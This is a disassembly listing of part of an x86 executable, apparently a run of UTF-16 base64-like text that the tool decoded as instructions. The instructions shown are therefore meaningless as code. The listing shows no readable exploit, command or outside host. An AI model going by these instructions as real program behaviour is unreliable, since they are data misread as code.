  40a37f:	00 68 00             	add    %ch,0x0(%eax)
  40a382:	79 00                	jns    0x40a384
  40a384:	62 00                	bound  %eax,(%eax)
  40a386:	42                   	inc    %edx
  40a387:	00 6f 00             	add    %ch,0x0(%edi)
  40a38a:	54                   	push   %esp
  40a38b:	00 79 00             	add    %bh,0x0(%ecx)
  40a38e:	33 00                	xor    (%eax),%eax
  40a390:	78 00                	js     0x40a392
  40a392:	78 00                	js     0x40a394
  40a394:	6c                   	insb   (%dx),%es:(%edi)
  40a395:	00 47 00             	add    %al,0x0(%edi)
  40a398:	72 00                	jb     0x40a39a
  40a39a:	47                   	inc    %edi
  40a39b:	00 55 00             	add    %dl,0x0(%ebp)
  40a39e:	48                   	dec    %eax
  40a39f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3a2:	37                   	aaa
  40a3a3:	00 37                	add    %dh,(%edi)
  40a3a5:	00 6e 00             	add    %ch,0x0(%esi)
  40a3a8:	47                   	inc    %edi
  40a3a9:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40a3ad:	00 46 00             	add    %al,0x0(%esi)
  40a3b0:	69 00 33 00 64 00    	imul   $0x640033,(%eax),%eax
  40a3b6:	71 00                	jno    0x40a3b8
  40a3b8:	35 00 2f 00 32       	xor    $0x32002f00,%eax
  40a3bd:	00 4a 00             	add    %cl,0x0(%edx)
  40a3c0:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a3c4:	78 00                	js     0x40a3c6
  40a3c6:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a3ca:	48                   	dec    %eax
  40a3cb:	00 7a 00             	add    %bh,0x0(%edx)
  40a3ce:	76 00                	jbe    0x40a3d0
  40a3d0:	2f                   	das
  40a3d1:	00 59 00             	add    %bl,0x0(%ecx)
  40a3d4:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40a3d8:	37                   	aaa
  40a3d9:	00 41 00             	add    %al,0x0(%ecx)
  40a3dc:	73 00                	jae    0x40a3de
  40a3de:	52                   	push   %edx
  40a3df:	00 7a 00             	add    %bh,0x0(%edx)
  40a3e2:	2b 00                	sub    (%eax),%eax
  40a3e4:	53                   	push   %ebx
  40a3e5:	00 7a 00             	add    %bh,0x0(%edx)
  40a3e8:	37                   	aaa
  40a3e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3ec:	39 00                	cmp    %eax,(%eax)
  40a3ee:	72 00                	jb     0x40a3f0
  40a3f0:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40a3f4:	58                   	pop    %eax
  40a3f5:	00 70 00             	add    %dh,0x0(%eax)
  40a3f8:	63 00                	arpl   %eax,(%eax)
  40a3fa:	4b                   	dec    %ebx
  40a3fb:	00 57 00             	add    %dl,0x0(%edi)
  40a3fe:	77 00                	ja     0x40a400
  40a400:	75 00                	jne    0x40a402
  40a402:	70 00                	jo     0x40a404
  40a404:	30 00                	xor    %al,(%eax)
  40a406:	77 00                	ja     0x40a408
  40a408:	38 00                	cmp    %al,(%eax)
  40a40a:	57                   	push   %edi
  40a40b:	00 31                	add    %dh,(%ecx)
  40a40d:	00 36                	add    %dh,(%esi)
  40a40f:	00 33                	add    %dh,(%ebx)
  40a411:	00 46 00             	add    %al,0x0(%esi)
  40a414:	63 00                	arpl   %eax,(%eax)
  40a416:	38 00                	cmp    %al,(%eax)
  40a418:	54                   	push   %esp
  40a419:	00 5a 00             	add    %bl,0x0(%edx)
  40a41c:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a420:	31 00                	xor    %eax,(%eax)
  40a422:	73 00                	jae    0x40a424
  40a424:	55                   	push   %ebp
  40a425:	00 6f 00             	add    %ch,0x0(%edi)
  40a428:	58                   	pop    %eax
  40a429:	00 71 00             	add    %dh,0x0(%ecx)
  40a42c:	71 00                	jno    0x40a42e
  40a42e:	73 00                	jae    0x40a430
  40a430:	41                   	inc    %ecx
  40a431:	00 41 00             	add    %al,0x0(%ecx)
  40a434:	4e                   	dec    %esi
  40a435:	00 41 00             	add    %al,0x0(%ecx)
  40a438:	71 00                	jno    0x40a43a
  40a43a:	68 00 43 00 65       	push   $0x65004300
  40a43f:	00 61 00             	add    %ah,0x0(%ecx)
  40a442:	79 00                	jns    0x40a444
  40a444:	71 00                	jno    0x40a446
  40a446:	71 00                	jno    0x40a448
  40a448:	51                   	push   %ecx
  40a449:	00 33                	add    %dh,(%ebx)
  40a44b:	00 72 00             	add    %dh,0x0(%edx)
  40a44e:	2b 00                	sub    (%eax),%eax
  40a450:	76 00                	jbe    0x40a452
  40a452:	5a                   	pop    %edx
  40a453:	00 2b                	add    %ch,(%ebx)
  40a455:	00 57 00             	add    %dl,0x0(%edi)
  40a458:	5a                   	pop    %edx
  40a459:	00 61 00             	add    %ah,0x0(%ecx)
  40a45c:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a460:	50                   	push   %eax
  40a461:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40a465:	00 41 00             	add    %al,0x0(%ecx)
  40a468:	78 00                	js     0x40a46a
  40a46a:	43                   	inc    %ebx
  40a46b:	00 6a 00             	add    %ch,0x0(%edx)
  40a46e:	78 00                	js     0x40a470
  40a470:	58                   	pop    %eax
  40a471:	00 69 00             	add    %ch,0x0(%ecx)
  40a474:	69 00 72 00 7a 00    	imul   $0x7a0072,(%eax),%eax
  40a47a:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40a47e:	49                   	dec    %ecx
  40a47f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a482:	76 00                	jbe    0x40a484
  40a484:	30 00                	xor    %al,(%eax)
  40a486:	38 00                	cmp    %al,(%eax)
  40a488:	77 00                	ja     0x40a48a
  40a48a:	4f                   	dec    %edi
  40a48b:	00 33                	add    %dh,(%ebx)
  40a48d:	00 4e 00             	add    %cl,0x0(%esi)
  40a490:	2b 00                	sub    (%eax),%eax
  40a492:	6c                   	insb   (%dx),%es:(%edi)
  40a493:	00 61 00             	add    %ah,0x0(%ecx)
  40a496:	52                   	push   %edx
  40a497:	00 73 00             	add    %dh,0x0(%ebx)
  40a49a:	62 00                	bound  %eax,(%eax)
  40a49c:	74 00                	je     0x40a49e
  40a49e:	52                   	push   %edx
  40a49f:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a4a3:	00 50 00             	add    %dl,0x0(%eax)
  40a4a6:	79 00                	jns    0x40a4a8
  40a4a8:	73 00                	jae    0x40a4aa
  40a4aa:	74 00                	je     0x40a4ac
  40a4ac:	32 00                	xor    (%eax),%al
  40a4ae:	51                   	push   %ecx
  40a4af:	00 79 00             	add    %bh,0x0(%ecx)
  40a4b2:	52                   	push   %edx
  40a4b3:	00 72 00             	add    %dh,0x0(%edx)
  40a4b6:	2f                   	das
  40a4b7:	00 73 00             	add    %dh,0x0(%ebx)
  40a4ba:	73 00                	jae    0x40a4bc
  40a4bc:	71 00                	jno    0x40a4be
  40a4be:	43                   	inc    %ebx
  40a4bf:	00 48 00             	add    %cl,0x0(%eax)
  40a4c2:	50                   	push   %eax
  40a4c3:	00 61 00             	add    %ah,0x0(%ecx)
  40a4c6:	34 00                	xor    $0x0,%al
  40a4c8:	77 00                	ja     0x40a4ca
  40a4ca:	4e                   	dec    %esi
  40a4cb:	00 73 00             	add    %dh,0x0(%ebx)
  40a4ce:	62 00                	bound  %eax,(%eax)
  40a4d0:	67 00 47 00          	add    %al,0x0(%bx)
  40a4d4:	35 00 64 00 78       	xor    $0x78006400,%eax
  40a4d9:	00 76 00             	add    %dh,0x0(%esi)
  40a4dc:	76 00                	jbe    0x40a4de
  40a4de:	5a                   	pop    %edx
  40a4df:	00 4f 00             	add    %cl,0x0(%edi)
  40a4e2:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40a4e6:	6d                   	insl   (%dx),%es:(%edi)
  40a4e7:	00 69 00             	add    %ch,0x0(%ecx)
  40a4ea:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40a4ee:	73 00                	jae    0x40a4f0
  40a4f0:	54                   	push   %esp
  40a4f1:	00 47 00             	add    %al,0x0(%edi)
  40a4f4:	36 00 32             	add    %dh,%ss:(%edx)
  40a4f7:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40a4fb:	00 2f                	add    %ch,(%edi)
  40a4fd:	00 50 00             	add    %dl,0x0(%eax)
  40a500:	70 00                	jo     0x40a502
  40a502:	6d                   	insl   (%dx),%es:(%edi)
  40a503:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40a507:	00 61 00             	add    %ah,0x0(%ecx)
  40a50a:	2b 00                	sub    (%eax),%eax
  40a50c:	41                   	inc    %ecx
  40a50d:	00 61 00             	add    %ah,0x0(%ecx)
  40a510:	31 00                	xor    %eax,(%eax)
  40a512:	6b 00 66             	imul   $0x66,(%eax),%eax
  40a515:	00 39                	add    %bh,(%ecx)
  40a517:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a51b:	00 49 00             	add    %cl,0x0(%ecx)
  40a51e:	56                   	push   %esi
  40a51f:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40a523:	00 6f 00             	add    %ch,0x0(%edi)
  40a526:	54                   	push   %esp
  40a527:	00 41 00             	add    %al,0x0(%ecx)
  40a52a:	71 00                	jno    0x40a52c
  40a52c:	68 00 57 00 77       	push   $0x77005700
  40a531:	00 45 00             	add    %al,0x0(%ebp)
  40a534:	43                   	inc    %ebx
  40a535:	00 2f                	add    %ch,(%edi)
  40a537:	00 43 00             	add    %al,0x0(%ebx)
  40a53a:	6d                   	insl   (%dx),%es:(%edi)
  40a53b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a53e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a542:	52                   	push   %edx
  40a543:	00 70 00             	add    %dh,0x0(%eax)
  40a546:	56                   	push   %esi
  40a547:	00 63 00             	add    %ah,0x0(%ebx)
  40a54a:	47                   	inc    %edi
  40a54b:	00 51 00             	add    %dl,0x0(%ecx)
  40a54e:	6c                   	insb   (%dx),%es:(%edi)
  40a54f:	00 2b                	add    %ch,(%ebx)
  40a551:	00 71 00             	add    %dh,0x0(%ecx)
  40a554:	43                   	inc    %ebx
  40a555:	00 79 00             	add    %bh,0x0(%ecx)
  40a558:	6e                   	outsb  %ds:(%esi),(%dx)
  40a559:	00 52 00             	add    %dl,0x0(%edx)
  40a55c:	33 00                	xor    (%eax),%eax
  40a55e:	32 00                	xor    (%eax),%al
  40a560:	58                   	pop    %eax
  40a561:	00 70 00             	add    %dh,0x0(%eax)
  40a564:	53                   	push   %ebx
  40a565:	00 69 00             	add    %ch,0x0(%ecx)
  40a568:	58                   	pop    %eax
  40a569:	00 6e 00             	add    %ch,0x0(%esi)
  40a56c:	45                   	inc    %ebp
  40a56d:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a571:	00 7a 00             	add    %bh,0x0(%edx)
  40a574:	58                   	pop    %eax
  40a575:	00 5a 00             	add    %bl,0x0(%edx)
  40a578:	78 00                	js     0x40a57a
  40a57a:	32 00                	xor    (%eax),%al
  40a57c:	36 00 4c 00 48       	add    %cl,%ss:0x48(%eax,%eax,1)
  40a581:	00 33                	add    %dh,(%ebx)
  40a583:	00 6e 00             	add    %ch,0x0(%esi)
  40a586:	56                   	push   %esi
  40a587:	00 45 00             	add    %al,0x0(%ebp)
  40a58a:	6d                   	insl   (%dx),%es:(%edi)
  40a58b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a58e:	33 00                	xor    (%eax),%eax
  40a590:	43                   	inc    %ebx
  40a591:	00 6d 00             	add    %ch,0x0(%ebp)
  40a594:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40a598:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a59c:	44                   	inc    %esp
  40a59d:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a5a1:	00 33                	add    %dh,(%ebx)
  40a5a3:	00 31                	add    %dh,(%ecx)
  40a5a5:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40a5a9:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40a5ad:	00 42 00             	add    %al,0x0(%edx)
  40a5b0:	34 00                	xor    $0x0,%al
  40a5b2:	4b                   	dec    %ebx
  40a5b3:	00 6f 00             	add    %ch,0x0(%edi)
  40a5b6:	6c                   	insb   (%dx),%es:(%edi)
  40a5b7:	00 56 00             	add    %dl,0x0(%esi)
  40a5ba:	5a                   	pop    %edx
  40a5bb:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40a5bf:	00 69 00             	add    %ch,0x0(%ecx)
  40a5c2:	30 00                	xor    %al,(%eax)
  40a5c4:	42                   	inc    %edx
  40a5c5:	00 73 00             	add    %dh,0x0(%ebx)
  40a5c8:	46                   	inc    %esi
  40a5c9:	00 38                	add    %bh,(%eax)
  40a5cb:	00 75 00             	add    %dh,0x0(%ebp)
  40a5ce:	78 00                	js     0x40a5d0
  40a5d0:	31 00                	xor    %eax,(%eax)
  40a5d2:	30 00                	xor    %al,(%eax)
  40a5d4:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40a5d8:	74 00                	je     0x40a5da
  40a5da:	33 00                	xor    (%eax),%eax
  40a5dc:	55                   	push   %ebp
  40a5dd:	00 56 00             	add    %dl,0x0(%esi)
  40a5e0:	37                   	aaa
  40a5e1:	00 38                	add    %bh,(%eax)
  40a5e3:	00 55 00             	add    %dl,0x0(%ebp)
  40a5e6:	2b 00                	sub    (%eax),%eax
  40a5e8:	50                   	push   %eax
  40a5e9:	00 51 00             	add    %dl,0x0(%ecx)
  40a5ec:	43                   	inc    %ebx
  40a5ed:	00 35 00 4b 00 4e    	add    %dh,0x4e004b00
  40a5f3:	00 55 00             	add    %dl,0x0(%ebp)
  40a5f6:	49                   	dec    %ecx
  40a5f7:	00 31                	add    %dh,(%ecx)
  40a5f9:	00 46 00             	add    %al,0x0(%esi)
  40a5fc:	42                   	inc    %edx
  40a5fd:	00 70 00             	add    %dh,0x0(%eax)
  40a600:	37                   	aaa
  40a601:	00 30                	add    %dh,(%eax)
  40a603:	00 59 00             	add    %bl,0x0(%ecx)
  40a606:	48                   	dec    %eax
  40a607:	00 65 00             	add    %ah,0x0(%ebp)
  40a60a:	42                   	inc    %edx
  40a60b:	00 55 00             	add    %dl,0x0(%ebp)
  40a60e:	68 00 33 00 65       	push   $0x65003300
  40a613:	00 59 00             	add    %bl,0x0(%ecx)
  40a616:	4d                   	dec    %ebp
  40a617:	00 4e 00             	add    %cl,0x0(%esi)
  40a61a:	2f                   	das
  40a61b:	00 53 00             	add    %dl,0x0(%ebx)
  40a61e:	56                   	push   %esi
  40a61f:	00 6a 00             	add    %ch,0x0(%edx)
  40a622:	36 00 64 00 39       	add    %ah,%ss:0x39(%eax,%eax,1)
  40a627:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a62b:	00 48 00             	add    %cl,0x0(%eax)
  40a62e:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a632:	4e                   	dec    %esi
  40a633:	00 35 00 4b 00 48    	add    %dh,0x48004b00
  40a639:	00 2f                	add    %ch,(%edi)
  40a63b:	00 7a 00             	add    %bh,0x0(%edx)
  40a63e:	39 00                	cmp    %eax,(%eax)
  40a640:	57                   	push   %edi
  40a641:	00 52 00             	add    %dl,0x0(%edx)
  40a644:	74 00                	je     0x40a646
  40a646:	43                   	inc    %ebx
  40a647:	00 46 00             	add    %al,0x0(%esi)
  40a64a:	52                   	push   %edx
  40a64b:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40a64f:	00 68 00             	add    %ch,0x0(%eax)
  40a652:	35 00 6d 00 4d       	xor    $0x4d006d00,%eax
  40a657:	00 50 00             	add    %dl,0x0(%eax)
  40a65a:	53                   	push   %ebx
  40a65b:	00 52 00             	add    %dl,0x0(%edx)
  40a65e:	6c                   	insb   (%dx),%es:(%edi)
  40a65f:	00 71 00             	add    %dh,0x0(%ecx)
  40a662:	79 00                	jns    0x40a664
  40a664:	50                   	push   %eax
  40a665:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a668:	2f                   	das
  40a669:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a66d:	00 30                	add    %dh,(%eax)
  40a66f:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40a673:	00 66 00             	add    %ah,0x0(%esi)
  40a676:	50                   	push   %eax
  40a677:	00 51 00             	add    %dl,0x0(%ecx)
  40a67a:	4b                   	dec    %ebx
  40a67b:	00 58 00             	add    %bl,0x0(%eax)
  40a67e:	76 00                	jbe    0x40a680
  40a680:	5a                   	pop    %edx
  40a681:	00 61 00             	add    %ah,0x0(%ecx)
  40a684:	6c                   	insb   (%dx),%es:(%edi)
  40a685:	00 5a 00             	add    %bl,0x0(%edx)
  40a688:	47                   	inc    %edi
  40a689:	00 38                	add    %bh,(%eax)
  40a68b:	00 68 00             	add    %ch,0x0(%eax)
  40a68e:	2b 00                	sub    (%eax),%eax
  40a690:	35 00 73 00 38       	xor    $0x38007300,%eax
  40a695:	00 63 00             	add    %ah,0x0(%ebx)
  40a698:	41                   	inc    %ecx
  40a699:	00 4d 00             	add    %cl,0x0(%ebp)
  40a69c:	7a 00                	jp     0x40a69e
  40a69e:	48                   	dec    %eax
  40a69f:	00 59 00             	add    %bl,0x0(%ecx)
  40a6a2:	4a                   	dec    %edx
  40a6a3:	00 43 00             	add    %al,0x0(%ebx)
  40a6a6:	42                   	inc    %edx
  40a6a7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6aa:	78 00                	js     0x40a6ac
  40a6ac:	55                   	push   %ebp
  40a6ad:	00 57 00             	add    %dl,0x0(%edi)
  40a6b0:	69 00 4b 00 68 00    	imul   $0x68004b,(%eax),%eax
  40a6b6:	4f                   	dec    %edi
  40a6b7:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a6bb:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40a6bf:	00 72 00             	add    %dh,0x0(%edx)
  40a6c2:	33 00                	xor    (%eax),%eax
  40a6c4:	75 00                	jne    0x40a6c6
  40a6c6:	78 00                	js     0x40a6c8
  40a6c8:	2b 00                	sub    (%eax),%eax
  40a6ca:	4b                   	dec    %ebx
  40a6cb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6ce:	46                   	inc    %esi
  40a6cf:	00 76 00             	add    %dh,0x0(%esi)
  40a6d2:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a6d6:	2b 00                	sub    (%eax),%eax
  40a6d8:	61                   	popa
  40a6d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a6dc:	71 00                	jno    0x40a6de
  40a6de:	35 00 68 00 32       	xor    $0x32006800,%eax
  40a6e3:	00 30                	add    %dh,(%eax)
  40a6e5:	00 59 00             	add    %bl,0x0(%ecx)
  40a6e8:	51                   	push   %ecx
  40a6e9:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a6ed:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6f1:	00 66 00             	add    %ah,0x0(%esi)
  40a6f4:	69 00 49 00 68 00    	imul   $0x680049,(%eax),%eax
  40a6fa:	50                   	push   %eax
  40a6fb:	00 47 00             	add    %al,0x0(%edi)
  40a6fe:	53                   	push   %ebx
  40a6ff:	00 66 00             	add    %ah,0x0(%esi)
  40a702:	70 00                	jo     0x40a704
  40a704:	79 00                	jns    0x40a706
  40a706:	63 00                	arpl   %eax,(%eax)
  40a708:	7a 00                	jp     0x40a70a
  40a70a:	61                   	popa
  40a70b:	00 55 00             	add    %dl,0x0(%ebp)
  40a70e:	6b 00 67             	imul   $0x67,(%eax),%eax
  40a711:	00 73 00             	add    %dh,0x0(%ebx)
  40a714:	48                   	dec    %eax
  40a715:	00 6d 00             	add    %ch,0x0(%ebp)
  40a718:	79 00                	jns    0x40a71a
  40a71a:	6d                   	insl   (%dx),%es:(%edi)
  40a71b:	00 46 00             	add    %al,0x0(%esi)
  40a71e:	78 00                	js     0x40a720
  40a720:	44                   	inc    %esp
  40a721:	00 73 00             	add    %dh,0x0(%ebx)
  40a724:	35 00 61 00 2b       	xor    $0x2b006100,%eax
  40a729:	00 2b                	add    %ch,(%ebx)
  40a72b:	00 52 00             	add    %dl,0x0(%edx)
  40a72e:	76 00                	jbe    0x40a730
  40a730:	79 00                	jns    0x40a732
  40a732:	45                   	inc    %ebp
  40a733:	00 56 00             	add    %dl,0x0(%esi)
  40a736:	42                   	inc    %edx
  40a737:	00 30                	add    %dh,(%eax)
  40a739:	00 39                	add    %bh,(%ecx)
  40a73b:	00 75 00             	add    %dh,0x0(%ebp)
  40a73e:	68 00 69 00 72       	push   $0x72006900
  40a743:	00 2b                	add    %ch,(%ebx)
  40a745:	00 4d 00             	add    %cl,0x0(%ebp)
  40a748:	39 00                	cmp    %eax,(%eax)
  40a74a:	2b 00                	sub    (%eax),%eax
  40a74c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a74d:	00 36                	add    %dh,(%esi)
  40a74f:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a753:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a757:	00 56 00             	add    %dl,0x0(%esi)
  40a75a:	61                   	popa
  40a75b:	00 77 00             	add    %dh,0x0(%edi)
  40a75e:	37                   	aaa
  40a75f:	00 68 00             	add    %ch,0x0(%eax)
  40a762:	58                   	pop    %eax
  40a763:	00 78 00             	add    %bh,0x0(%eax)
  40a766:	4f                   	dec    %edi
  40a767:	00 58 00             	add    %bl,0x0(%eax)
  40a76a:	4b                   	dec    %ebx
  40a76b:	00 33                	add    %dh,(%ebx)
  40a76d:	00 31                	add    %dh,(%ecx)
  40a76f:	00 33                	add    %dh,(%ebx)
  40a771:	00 71 00             	add    %dh,0x0(%ecx)
  40a774:	65 00 37             	add    %dh,%gs:(%edi)
  40a777:	00 72 00             	add    %dh,0x0(%edx)
  40a77a:	58                   	pop    %eax
  40a77b:	00 6e 00             	add    %ch,0x0(%esi)
  40a77e:	4b                   	dec    %ebx
  40a77f:	00 56 00             	add    %dl,0x0(%esi)
  40a782:	46                   	inc    %esi
  40a783:	00 49 00             	add    %cl,0x0(%ecx)
  40a786:	45                   	inc    %ebp
  40a787:	00 49 00             	add    %cl,0x0(%ecx)
  40a78a:	77 00                	ja     0x40a78c
  40a78c:	75 00                	jne    0x40a78e
  40a78e:	41                   	inc    %ecx
  40a78f:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40a793:	00 35 00 4b 00 6f    	add    %dh,0x6f004b00
  40a799:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40a79d:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40a7a1:	00 51 00             	add    %dl,0x0(%ecx)
  40a7a4:	49                   	dec    %ecx
  40a7a5:	00 33                	add    %dh,(%ebx)
  40a7a7:	00 52 00             	add    %dl,0x0(%edx)
  40a7aa:	4b                   	dec    %ebx
  40a7ab:	00 6e 00             	add    %ch,0x0(%esi)
  40a7ae:	61                   	popa
  40a7af:	00 52 00             	add    %dl,0x0(%edx)
  40a7b2:	70 00                	jo     0x40a7b4
  40a7b4:	78 00                	js     0x40a7b6
  40a7b6:	55                   	push   %ebp
  40a7b7:	00 2b                	add    %ch,(%ebx)
  40a7b9:	00 71 00             	add    %dh,0x0(%ecx)
  40a7bc:	61                   	popa
  40a7bd:	00 38                	add    %bh,(%eax)
  40a7bf:	00 72 00             	add    %dh,0x0(%edx)
  40a7c2:	41                   	inc    %ecx
  40a7c3:	00 76 00             	add    %dh,0x0(%esi)
  40a7c6:	79 00                	jns    0x40a7c8
  40a7c8:	76 00                	jbe    0x40a7ca
  40a7ca:	6b 00 42             	imul   $0x42,(%eax),%eax
  40a7cd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7d0:	74 00                	je     0x40a7d2
  40a7d2:	51                   	push   %ecx
  40a7d3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7d6:	72 00                	jb     0x40a7d8
  40a7d8:	6a 00                	push   $0x0
  40a7da:	79 00                	jns    0x40a7dc
  40a7dc:	58                   	pop    %eax
  40a7dd:	00 38                	add    %bh,(%eax)
  40a7df:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7e2:	71 00                	jno    0x40a7e4
  40a7e4:	43                   	inc    %ebx
  40a7e5:	00 46 00             	add    %al,0x0(%esi)
  40a7e8:	6a 00                	push   $0x0
  40a7ea:	44                   	inc    %esp
  40a7eb:	00 38                	add    %bh,(%eax)
  40a7ed:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40a7f1:	00 49 00             	add    %cl,0x0(%ecx)
  40a7f4:	51                   	push   %ecx
  40a7f5:	00 77 00             	add    %dh,0x0(%edi)
  40a7f8:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40a7fc:	5a                   	pop    %edx
  40a7fd:	00 35 00 50 00 47    	add    %dh,0x47005000
  40a803:	00 2b                	add    %ch,(%ebx)
  40a805:	00 58 00             	add    %bl,0x0(%eax)
  40a808:	58                   	pop    %eax
  40a809:	00 52 00             	add    %dl,0x0(%edx)
  40a80c:	31 00                	xor    %eax,(%eax)
  40a80e:	52                   	push   %edx
  40a80f:	00 39                	add    %bh,(%ecx)
  40a811:	00 46 00             	add    %al,0x0(%esi)
  40a814:	48                   	dec    %eax
  40a815:	00 77 00             	add    %dh,0x0(%edi)
  40a818:	49                   	dec    %ecx
  40a819:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a81d:	00 75 00             	add    %dh,0x0(%ebp)
  40a820:	4e                   	dec    %esi
  40a821:	00 43 00             	add    %al,0x0(%ebx)
  40a824:	76 00                	jbe    0x40a826
  40a826:	75 00                	jne    0x40a828
  40a828:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a82b:	00 72 00             	add    %dh,0x0(%edx)
  40a82e:	72 00                	jb     0x40a830
  40a830:	76 00                	jbe    0x40a832
  40a832:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40a836:	5a                   	pop    %edx
  40a837:	00 70 00             	add    %dh,0x0(%eax)
  40a83a:	51                   	push   %ecx
  40a83b:	00 4a 00             	add    %cl,0x0(%edx)
  40a83e:	50                   	push   %eax
  40a83f:	00 6f 00             	add    %ch,0x0(%edi)
  40a842:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a846:	6f                   	outsl  %ds:(%esi),(%dx)
  40a847:	00 68 00             	add    %ch,0x0(%eax)
  40a84a:	70 00                	jo     0x40a84c
  40a84c:	4f                   	dec    %edi
  40a84d:	00 5a 00             	add    %bl,0x0(%edx)
  40a850:	31 00                	xor    %eax,(%eax)
  40a852:	41                   	inc    %ecx
  40a853:	00 7a 00             	add    %bh,0x0(%edx)
  40a856:	78 00                	js     0x40a858
  40a858:	66 00 47 00          	data16 add %al,0x0(%edi)
  40a85c:	2b 00                	sub    (%eax),%eax
  40a85e:	78 00                	js     0x40a860
  40a860:	38 00                	cmp    %al,(%eax)
  40a862:	4f                   	dec    %edi
  40a863:	00 51 00             	add    %dl,0x0(%ecx)
  40a866:	57                   	push   %edi
  40a867:	00 62 00             	add    %ah,0x0(%edx)
  40a86a:	74 00                	je     0x40a86c
  40a86c:	78 00                	js     0x40a86e
  40a86e:	30 00                	xor    %al,(%eax)
  40a870:	2b 00                	sub    (%eax),%eax
  40a872:	45                   	inc    %ebp
  40a873:	00 50 00             	add    %dl,0x0(%eax)
  40a876:	2f                   	das
  40a877:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40a87b:	00 53 00             	add    %dl,0x0(%ebx)
  40a87e:	56                   	push   %esi
  40a87f:	00 35 00 42 00 53    	add    %dh,0x53004200
  40a885:	00 72 00             	add    %dh,0x0(%edx)
  40a888:	62 00                	bound  %eax,(%eax)
  40a88a:	38 00                	cmp    %al,(%eax)
  40a88c:	78 00                	js     0x40a88e
  40a88e:	75 00                	jne    0x40a890
  40a890:	36 00 35 00 6a 00 2b 	add    %dh,%ss:0x2b006a00
  40a897:	00 53 00             	add    %dl,0x0(%ebx)
  40a89a:	76 00                	jbe    0x40a89c
  40a89c:	41                   	inc    %ecx
  40a89d:	00 73 00             	add    %dh,0x0(%ebx)
  40a8a0:	63 00                	arpl   %eax,(%eax)
  40a8a2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8a3:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40a8a7:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40a8ab:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40a8af:	00 6a 00             	add    %ch,0x0(%edx)
  40a8b2:	39 00                	cmp    %eax,(%eax)
  40a8b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8b5:	00 62 00             	add    %ah,0x0(%edx)
  40a8b8:	58                   	pop    %eax
  40a8b9:	00 33                	add    %dh,(%ebx)
  40a8bb:	00 76 00             	add    %dh,0x0(%esi)
  40a8be:	76 00                	jbe    0x40a8c0
  40a8c0:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a8c4:	74 00                	je     0x40a8c6
  40a8c6:	4d                   	dec    %ebp
  40a8c7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8ca:	32 00                	xor    (%eax),%al
  40a8cc:	50                   	push   %eax
  40a8cd:	00 57 00             	add    %dl,0x0(%edi)
  40a8d0:	59                   	pop    %ecx
  40a8d1:	00 37                	add    %dh,(%edi)
  40a8d3:	00 4e 00             	add    %cl,0x0(%esi)
  40a8d6:	30 00                	xor    %al,(%eax)
  40a8d8:	41                   	inc    %ecx
